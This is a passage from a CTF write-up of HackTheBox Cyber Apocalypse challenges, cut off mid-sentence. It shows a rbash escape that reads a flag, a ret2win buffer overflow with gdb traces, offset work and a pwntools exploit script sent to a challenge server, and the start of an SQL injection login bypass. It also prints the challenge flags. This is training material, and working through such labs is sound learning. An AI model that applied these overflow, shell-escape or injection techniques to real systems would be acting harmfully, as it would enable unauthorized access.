165.232.100.46:31980/flag done -s flag makes the curl request silent, otherwise we will get transmission informations on every curl attempt. This loop only runs for 1000 attempts, but if you\u0026rsquo;re watching the program you can have it set to run indefinitely and just manually close it when the flag is seen. Running the script:\n1 2 $ chmod +x loop.sh $ ./loop.sh | grep \u0026#34;HTB\u0026#34; grep allows us to filter any uninteresting output and only shows our flag. Eventually, we see the results pop out at us.\n1 HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}jW\u0026amp;z3]X8CLb5Q7kR The flag information includes only HTB and the content in brackets. A cleaner grep would have extracted only the flag. Overall, it seems output of the flag is based on a ~0.1% chance. On average, you will get the flag within 1000 requests but not always. HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}\nRestricted You \u0026rsquo;re still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment? Difficulty: easy\nBy exploring the provided sshd_config file, we can see for the user restricted we are permitted empty passwords. And so, our entry into the system is through ssh as the user restricted:\n1 2 3 4 5 6 7 8 9 10 11 $ ssh restricted@167.99.86.8 -p 32608 Linux ng-restricted-rtgbl-c6f644c76-t5z7n 5.18.0-0.deb11.4-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.16-1~bpo11+1 (2022-08-12) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Mar 23 23:40:20 2023 from 167.99.86.8 restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ Upon entry, we can check a few commands and see extremely limited options. We are unable to do traditional navigation commands such as ls or cd. However, we do have access to other powerful bash builtins such as echo and read. We can use echo to browse directories in a similar manner to ls:\n1 2 restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ echo .* . .. .bash_history .bash_logout .bash_profile .bashrc .bin .profile In our current directory, there is nothing that looks like a flag. Checking elsewhere:\n1 2 restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ echo /* /bin /boot /dev /etc /flag_8dpsy /home /lib /lib64 /media /memories.dump /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var flag_8dpsy looks like a potential candidate. To view, we can leverage echo and read together:\n1 2 restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ read IFR \u0026lt; /flag_8dpsy; echo $IFR HTB{r35tr1ct10n5_4r3_p0w3r1355} Alternative Method, selecting bash as ssh terminal.\nUser restricted has its default terminal set to rbash, the restricted terminal we previously worked in. However, we can just as easily pick our own terminal agent at ssh launch:\n1 2 3 4 5 $ ssh restricted@167.99.86.8 -p 32608 -t bash restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ whoami restricted restricted@ng-restricted-rtgbl-c6f644c76-t5z7n:~$ cat /flag_8dpsy HTB{r35tr1ct10n5_4r3_p0w3r1355} HTB{r35tr1ct10n5_4r3_p0w3r1355}\nPwn Labyrinth You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences. Difficulty: easy\nWe are given a labyrinth executable:\n1 2 3 4 5 6 $ file labyrinth labyrinth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=86c87230616a87809e53b766b99987df9bf89ad8, for GNU/Linux 3.2.0, not stripped $ checksec --file=labyrinth RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Full RELRO No canary found NX enabled No PIE No RPATH RW-RUNPATH 83 Symbols No 0 4labyrinth We see this is a non stripped ELF 64-bit binary, and checksec reveals no canary and no PIE.\nRunning labyrinth, from the very start, we are given a choice between 100 options:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ O ▒ ▒ ▒-▸ ▒ \u0026#39;|\u0026#39; ▒ ▒ ▒-▸ ▒ / \\ ▒ ▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒ Select door: Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 \u0026gt;\u0026gt; 1 [-] YOU FAILED TO ESCAPE! An incorrect answer exits the program. We can try to go through this manually, but we can also find the answer in the file itself:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 $ cat labyrinth \u0026lt;..SNIP..\u0026gt; ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ O ▒ ▒ ▒-▸ ▒ \u0026#39;|\u0026#39; ▒ ▒ ▒-▸ ▒ / \\ ▒ ▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒ Select door: Door: 00%d Door: 0%d Door: %d \u0026gt;\u0026gt; 69069 You are heading to open the door but you suddenly see something on the wall: \u0026#34;Fly like a bird and be free!\u0026#34; Would you like to change the door you chose? \u0026gt;\u0026gt; \u0026lt;..SNIP..\u0026gt; We can see 69069, likely accepting valid answers for both 69 and 069.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ O ▒ ▒ ▒-▸ ▒ \u0026#39;|\u0026#39; ▒ ▒ ▒-▸ ▒ / \\ ▒ ▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒ Select door: Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 \u0026gt;\u0026gt; 69 You are heading to open the door but you suddenly see something on the wall: \u0026#34;Fly like a bird and be free!\u0026#34; Would you like to change the door you chose? \u0026gt;\u0026gt; 69 [-] YOU FAILED TO ESCAPE! We progressed one stage, but we are still stuck. Is this second input expecting a number, or something else?\n1 2 3 4 5 6 7 8 9 Fly like a bird and be free!\u0026#34; Would you like to change the door you chose? \u0026gt;\u0026gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA [-] YOU FAILED TO ESCAPE! zsh: segmentation fault ./labyrinth We reached a segmentation fault, so this might be a target for buffer overflow.\nUsing Radare2 to find win address:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 r2 labyrinth -- º|\u0026lt;|\u0026lt;| -( glu glu glu, im the r2 fish ) [0x00401140]\u0026gt; aaaa INFO: Analyze all flags starting with sym. and entry0 (aa) INFO: Analyze all functions arguments/locals (afva@@@F) INFO: Analyze function calls (aac) INFO: Analyze len bytes of instructions for references (aar) INFO: Finding and parsing C++ vtables (avrr) INFO: Type matching analysis for all functions (aaft) INFO: Propagate noreturn information (aanr) INFO: Scanning for strings constructed in code (/azs) INFO: Finding function preludes (aap) INFO: Enable anal.types.constraint for experimental type propagation [0x00401140]\u0026gt; afl 0x00401140 1 42 entry0 0x00401180 4 31 sym.deregister_tm_clones 0x004011b0 4 49 sym.register_tm_clones 0x004011f0 3 28 sym.__do_global_dtors_aux 0x00401220 1 2 sym.frame_dummy 0x00401670 1 1 sym.__libc_csu_fini 0x00401255 5 208 sym.escape_plan 0x00401030 1 6 sym.imp.putchar 0x00401130 1 6 sym.imp.fwrite 0x004010c0 1 6 sym.imp.fprintf 0x004010f0 1 6 sym.imp.open 0x00401100 1 6 sym.imp.perror 0x00401120 1 6 sym.imp.exit 0x00401090 1 6 sym.imp.fputc 0x004010a0 1 6 sym.imp.read 0x00401080 1 6 sym.imp.close 0x00401674 1 9 sym._fini 0x0040137b 1 51 sym.banner 0x00401050 1 6 sym.imp.puts 0x00401610 4 93 sym.__libc_csu_init 0x00401222 1 51 sym.cls 0x00401060 1 6 sym.imp.printf 0x00401170 1 1 sym._dl_relocate_static_pie 0x00401405 15 510 main 0x00401325 1 86 sym.read_num 0x00401110 1 6 sym.imp.strtoul 0x00401000 3 23 sym._init 0x004013ae 1 87 sym.setup 0x004010e0 1 6 sym.imp.setvbuf 0x00401070 1 6 sym.imp.alarm 0x00401040 1 6 sym.imp.strncmp 0x004010b0 1 6 sym.imp.fgets 0x004010d0 1 6 sym.imp.malloc sym.escape_plan looks interesting by name, and the size also suggests there might be a few things going on.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 pdf @ sym.escape_plan ┌ 208: sym.escape_plan (); │ ; var uint32_t fildes @ rbp-0x4 │ ; var void *buf @ rbp-0x5 │ 0x00401255 55 push rbp │ 0x00401256 4889e5 mov rbp, rsp │ 0x00401259 4883ec10 sub rsp, 0x10 │ 0x0040125d bf0a000000 mov edi, 0xa ; int c │ 0x00401262 e8c9fdffff call sym.imp.putchar ; int putchar(int c) │ 0x00401267 488b05a22d00. mov rax, qword [obj.stdout] ; obj.__TMC_END__ │ ; [0x404010:8]=0 │ 0x0040126e 4889c1 mov rcx, rax ; FILE *stream │ 0x00401271 baf0010000 mov edx, 0x1f0 ; 496 ; size_t nitems │ 0x00401276 be01000000 mov esi, 1 ; size_t size │ 0x0040127b 488d3d960d00. lea rdi, str.________________O_________________n___________________________________n__________________________________n____n_______________________________n_______________________________n_______________________________n_______________________________n_n ; 0x402018 ; \u0026#34; \\O/ \\n | \\n / \\ \\n\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592 \\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\n\\u2592-\\u25b8 \\u2592 \\u2592 \\u2592\\n\\u2592-\\u25b8 \\u2592 \\u2592 \\u2592\\n\\u2592-\\u25b8 \\u2592 \\u2592 \\u2592\\n\\u2592-\\u25b8 \\u2592 \\u2592 \\u2592\\n\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\u2592\\xe2\u0026#34; ; const void *ptr │ 0x00401282 e8a9feffff call sym.imp.fwrite ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream) │ 0x00401287 488b05822d00. mov rax, qword [obj.stdout] ; obj.__TMC_END__ │ ; [0x404010:8]=0 │ 0x0040128e 488d0d740f00. lea rcx, str.e_0m ; 0x402209 │ 0x00401295 488d15720f00. lea rdx, str.e_1_32m ; 0x40220e │ 0x0040129c 488d35750f00. lea rsi, str._n_sCongratulations_on_escaping__Here_is_a_sacred_spell_to_help_you_continue_your_journey:__s_n ; 0x402218 ; \u0026#34;\\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s\\n\u0026#34; ; const char *format │ 0x004012a3 4889c7 mov rdi, rax ; FILE *stream │ 0x004012a6 b800000000 mov eax, 0 │ 0x004012ab e810feffff call sym.imp.fprintf ; int fprintf(FILE *stream, const char *format, ...) │ 0x004012b0 be00000000 mov esi, 0 ; int oflag │ 0x004012b5 488d3dba0f00. lea rdi, str.._flag.txt ; 0x402276 ; \u0026#34;./flag.txt\u0026#34; ; const char *path │ 0x004012bc b800000000 mov eax, 0 │ 0x004012c1 e82afeffff call sym.imp.open ; int open(const char *path, int oflag) │ 0x004012c6 8945fc mov dword [fildes], eax │ 0x004012c9 837dfc00 cmp dword [fildes], 0 │ ┌─\u0026lt; 0x004012cd 792e jns 0x4012fd │ │ 0x004012cf 488d3db20f00. lea rdi, str._nError_opening_flag.txt__please_contact_an_Administrator._n_n ; 0x402288 ; \u0026#34;\\nError opening flag.txt, please contact an Administrator.\\n\\n\u0026#34; ; const char *s \u0026lt;...SNIP...\u0026gt; We can see a victory text at address 0x0040129c. A little further down we can see actions to open and print the flag.txt. If we can return tho this address, we might be able to produce a victory screen. Firstly, to determine the offset of the overflow:\n1 2 $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 running in gdb:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 [----------------------------------registers-----------------------------------] RAX: 0x0 RBX: 0x0 RCX: 0x7ffff7d14a37 (\u0026lt;write+23\u0026gt;: cmp rax,0xfffffffffffff000) RDX: 0x0 RSI: 0x7fffffffbc20 --\u0026gt; 0x6d31333b315b1b0a RDI: 0x7fffffffbb00 --\u0026gt; 0x7ffff7c620d0 (\u0026lt;funlockfile\u0026gt;: endbr64) RBP: 0x5f6e726574746170 (\u0026#39;pattern_\u0026#39;) RSP: 0x7fffffffdd78 (\u0026#34;create.rb -\u0026#34;) RIP: 0x401602 (\u0026lt;main+509\u0026gt;: ret) R8 : 0x23 (\u0026#39;#\u0026#39;) R9 : 0x7ffff7d7cd70 (mov r10,QWORD PTR [rsi-0x1b]) R10: 0x20554f59205d2d5b (\u0026#39;[-] YOU \u0026#39;) R11: 0x246 R12: 0x7fffffffde88 --\u0026gt; 0x7fffffffe1da (\u0026#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth\u0026#34;) R13: 0x401405 (\u0026lt;main\u0026gt;: push rbp) R14: 0x0 R15: 0x7ffff7ffd040 --\u0026gt; 0x7ffff7ffe2e0 --\u0026gt; 0x0 EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x4015f7 \u0026lt;main+498\u0026gt;: call 0x4010c0 \u0026lt;fprintf@plt\u0026gt; 0x4015fc \u0026lt;main+503\u0026gt;: mov eax,0x0 0x401601 \u0026lt;main+508\u0026gt;: leave =\u0026gt; 0x401602 \u0026lt;main+509\u0026gt;: ret 0x401603: cs nop WORD PTR [rax+rax*1+0x0] 0x40160d: nop DWORD PTR [rax] 0x401610 \u0026lt;__libc_csu_init\u0026gt;: push r15 0x401612 \u0026lt;__libc_csu_init+2\u0026gt;: lea r15,[rip+0x2727] # 0x403d40 [------------------------------------stack-------------------------------------] 0000| 0x7fffffffdd78 (\u0026#34;create.rb -\u0026#34;) 0008| 0x7fffffffdd80 --\u0026gt; 0x2d2062 (\u0026#39;b -\u0026#39;) 0016| 0x7fffffffdd88 --\u0026gt; 0x401405 (\u0026lt;main\u0026gt;: push rbp) 0024| 0x7fffffffdd90 --\u0026gt; 0x100000000 0032| 0x7fffffffdd98 --\u0026gt; 0x7fffffffde88 --\u0026gt; 0x7fffffffe1da (\u0026#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth\u0026#34;) 0040| 0x7fffffffdda0 --\u0026gt; 0x0 0048| 0x7fffffffdda8 --\u0026gt; 0x78a85a85f5d4e10b 0056| 0x7fffffffddb0 --\u0026gt; 0x7fffffffde88 --\u0026gt; 0x7fffffffe1da (\u0026#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth\u0026#34;) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x0000000000401602 in main () The RBP contains an overflow address 0x6241376241366241. Calculating offset:\n1 2 $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6241376241366241 [*] Exact match at offset 48 Double checking offset:\n1 2 $ python -c \u0026#39;print(\u0026#34;A\u0026#34;*48+\u0026#34;B\u0026#34;*8)\u0026#39; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB gdb test\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 [----------------------------------registers-----------------------------------] RAX: 0x0 RBX: 0x0 RCX: 0x7ffff7d14a37 (\u0026lt;write+23\u0026gt;: cmp rax,0xfffffffffffff000) RDX: 0x0 RSI: 0x7fffffffbc20 --\u0026gt; 0x6d31333b315b1b0a RDI: 0x7fffffffbb00 --\u0026gt; 0x7ffff7c620d0 (\u0026lt;funlockfile\u0026gt;: endbr64) RBP: 0x4242424242424242 (\u0026#39;BBBBBBBB\u0026#39;) RSP: 0x7fffffffdd80 --\u0026gt; 0x0 RIP: 0x7ffff7c2000a --\u0026gt; 0x1000000000000 R8 : 0x23 (\u0026#39;#\u0026#39;) R9 : 0x7ffff7d7cd70 (mov r10,QWORD PTR [rsi-0x1b]) R10: 0x20554f59205d2d5b (\u0026#39;[-] YOU \u0026#39;) R11: 0x246 R12: 0x7fffffffde88 --\u0026gt; 0x7fffffffe1da (\u0026#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth\u0026#34;) R13: 0x401405 (\u0026lt;main\u0026gt;: push rbp) R14: 0x0 R15: 0x7ffff7ffd040 --\u0026gt; 0x7ffff7ffe2e0 --\u0026gt; 0x0 EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x7ffff7c20003: add BYTE PTR [rax],cl 0x7ffff7c20005: add BYTE PTR [rax],al 0x7ffff7c20007: add BYTE PTR [rdi+0x7e],dl =\u0026gt; 0x7ffff7c2000a: add BYTE PTR [rax],al 0x7ffff7c2000c: add BYTE PTR [rax],al 0x7ffff7c2000e: add BYTE PTR [rax],al 0x7ffff7c20010: add DWORD PTR [rax],eax 0x7ffff7c20012: add BYTE PTR [rax],al [------------------------------------stack-------------------------------------] 0000| 0x7fffffffdd80 --\u0026gt; 0x0 0008| 0x7fffffffdd88 --\u0026gt; 0x401405 (\u0026lt;main\u0026gt;: push rbp) 0016| 0x7fffffffdd90 --\u0026gt; 0x100000000 0024| 0x7fffffffdd98 --\u0026gt; 0x7fffffffde88 --\u0026gt; 0x7fffffffe1da (\u0026#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth\u0026#34;) 0032| 0x7fffffffdda0 --\u0026gt; 0x0 0040| 0x7fffffffdda8 --\u0026gt; 0xb6dc04cf7d4b5e83 0048| 0x7fffffffddb0 --\u0026gt; 0x7fffffffde88 --\u0026gt; 0x7fffffffe1da (\u0026#34;/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth\u0026#34;) 0056| 0x7fffffffddb8 --\u0026gt; 0x401405 (\u0026lt;main\u0026gt;: push rbp) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x00007ffff7c2000a in ?? () from ./glibc/libc.so.6 RBP: 0x4242424242424242 (\u0026lsquo;BBBBBBBB\u0026rsquo;). We know our overflow is successful, and now we can put whatever payload for the return function.\nFirst we can try pointing to the start of escape plan:\n1 2 3 4 5 6 7 8 9 $ python2 -c \u0026#39;print(\u0026#34;69+\\n\u0026#34;+\u0026#34;A\u0026#34;*48+\u0026#34;\\x55\\x12\\x40\\x00\\x00\\x00\\x00\\x00\u0026#34;)\u0026#39; | ./labyrinth \u0026lt;...SNIP...\u0026gt; Would you like to change the door you chose? \u0026gt;\u0026gt; [-] YOU FAILED TO ESCAPE! zsh: done python2 -c \u0026#39;print(\u0026#34;69+\\n\u0026#34;+\u0026#34;A\u0026#34;*48+\u0026#34;\\x55\\x12\\x40\\x00\\x00\\x00\\x00\\x00\u0026#34;)\u0026#39; | zsh: segmentation fault ./labyrinth Unfortunately preparing it this way does not work so well. I found a writeup for a similar ret2win problem that discusses the need for an additional return due in newer Ubuntu versions due to a MOVAPS issue. I\u0026rsquo;ll try this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 python2 -c \u0026#39;print(\u0026#34;69+\\n\u0026#34;+\u0026#34;A\u0026#34;*48+\u0026#34;\\x16\\x10\\x40\\x00\\x00\\x00\\x00\\x00\u0026#34;+\u0026#34;\\x55\\x12\\x40\\x00\\x00\\x00\\x00\\x00\u0026#34;)\u0026#39; | ./labyrinth \u0026lt;...snip...\u0026gt; Would you like to change the door you chose? \u0026gt;\u0026gt; [-] YOU FAILED TO ESCAPE! \\O/ | / \\ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ ▒ ▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒ zsh: done python2 -c | zsh: segmentation fault ./labyrinth We have a happy escapee, but we don\u0026rsquo;t see the victory text or our flag. The return seems successful, but our target address isn\u0026rsquo;t quite right? After this step I decided to write a python script that will be able to connect to the remote server and submit our payload. Lastly, after guessing a few addresses within escape_plan, I finally landed on one that works.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * #elf = ELF(\u0026#39;labyrinth\u0026#39;) p = remote(\u0026#39;167.172.50.208\u0026#39;, 30667) payload = b\u0026#34;A\u0026#34;*48 payload += p64(0x401016) payload += p64(0x401256) p.sendline(\u0026#34;69\u0026#34;) p.sendline(payload) p.interactive() response = p.recvall() print(re.search(\u0026#34;(ROPE{.*?})\u0026#34;,response.decode())) Full output from payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 $ python escape.py [+] Opening connection to 178.62.9.10 on port 31908: Done /home/kali/Documents/cyber_apocalyse/pwn/challenge/e2.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes p.sendline(\u0026#34;69\u0026#34;) [*] Switching to interactive mode ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ O ▒ ▒ ▒-▸ ▒ \u0026#39;|\u0026#39; ▒ ▒ ▒-▸ ▒ / \\ ▒ ▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒ Select door: Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 \u0026gt;\u0026gt; You are heading to open the door but you suddenly see something on the wall: \u0026#34;Fly like a bird and be free!\u0026#34; Would you like to change the door you chose? \u0026gt;\u0026gt; [-] YOU FAILED TO ESCAPE! \\O/ | / \\ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ ▒ ▒ ▒-▸ ▒ ▒ ▒ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒ Congratulations on escaping! Here is a sacred spell to help you continue your journey: HTB{3sc4p3_fr0m_4b0v3} We managed to get the flag, but working out the address ended up as guess-and-check for me. HTB{3sc4p3_fr0m_4b0v3}\nWeb Drobots Pandora\u0026rsquo;s latest mission as part of her reconnaissance training is to infiltrate the Drobots firm that was suspected of engaging in illegal activities. Can you help pandora with this task? Difficulty: very easy\nVisiting the site gives us a generic login page. Trying the classic admin:admin and admin:password failed, so it\u0026rsquo;s time to take a look at the source code supplied. Exploring database.py we see the following configuration:\n1 2 3 def login(username, password): # We should update our code base and use techniques like parameterization to avoid SQL Injection user = query_db(f\u0026#39;SELECT password FROM users WHERE username = \u0026#34;{username}\u0026#34; AND password = \u0026#34;{password}\u0026#34; \u0026#39;, one=True) The comment is a pretty plain hint that this SQL query is not well sanitized, and allows for very basic SQL injection. For our user submission, we will escape the username query with \u0026ldquo;, then bypass a password check with \u0026ldquo;OR 1=1 \u0026ndash; \u0026ldquo;. The end result is we will login if the database can find a user called \u0026quot;\u0026rdquo; or if the value 1 is equal to 1. Since the latter is always true, we should login. Note that the space after comment lines \u0026ndash; 